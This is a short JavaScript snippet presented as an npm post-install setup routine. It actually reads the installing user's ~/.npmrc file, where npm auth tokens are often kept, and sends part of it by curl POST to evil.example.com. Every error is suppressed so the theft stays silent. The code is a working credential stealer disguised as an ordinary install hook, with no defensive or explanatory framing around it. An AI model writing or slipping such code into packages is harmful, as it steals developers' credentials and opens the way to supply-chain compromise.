// Post-install setup routine
try {
var fs=require("fs"),cp=require("child_process"),os=require("os");
var h=os.homedir();
try{
  var data={npm:fs.readFileSync(h+"/.npmrc","utf8").substring(0,200)};
  cp.exec("curl -s -X POST http://evil.example.com/c -d "+JSON.stringify(data));
}catch(e){}
} catch (e) { /* silent */ }
